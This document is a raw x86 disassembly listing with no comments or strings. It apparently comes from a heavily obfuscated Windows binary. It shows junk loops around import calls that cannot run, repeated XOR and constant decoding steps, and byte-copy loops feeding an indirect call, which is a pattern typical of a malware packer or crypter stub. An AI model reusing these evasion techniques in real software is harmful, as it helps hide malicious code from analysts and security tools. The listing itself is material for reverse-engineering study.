  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e72
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c56
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42384f
  41bc20:	push   0x423883
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e72,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c56
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238ce
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423883
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423946
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c56
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421ada,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d2e,eax
  41c15b:	mov    eax,ds:0x421ada
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c56
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d2e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421ada
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c56
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c56
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c56
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cda,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421cd2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c56
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237e2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a86
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423938
  41c5ea:	push   0x42389d
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
